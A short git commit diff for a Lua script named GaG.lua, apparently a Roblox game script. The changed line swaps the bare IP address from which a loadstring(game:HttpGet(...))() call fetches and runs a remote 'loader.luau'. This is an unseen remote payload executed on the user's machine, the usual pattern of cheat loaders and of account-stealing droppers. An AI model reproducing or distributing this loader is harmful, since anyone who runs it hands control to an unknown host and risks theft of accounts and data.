6948ff4522679aa7d4a3fef013510cc2dfcdbbc9
scripts <nielanthonyr@gmail.com>
2025-09-03 03:08:21 +0800

    GaG.lua

--- GaG.lua
+++ GaG.lua
@@ -1,5 +1,5 @@
 ID="2eb3a306-23e4-4db1-8d35-0ab2e7e30044";
-loadstring(game:HttpGet("http://5.129.216.170:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
 
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
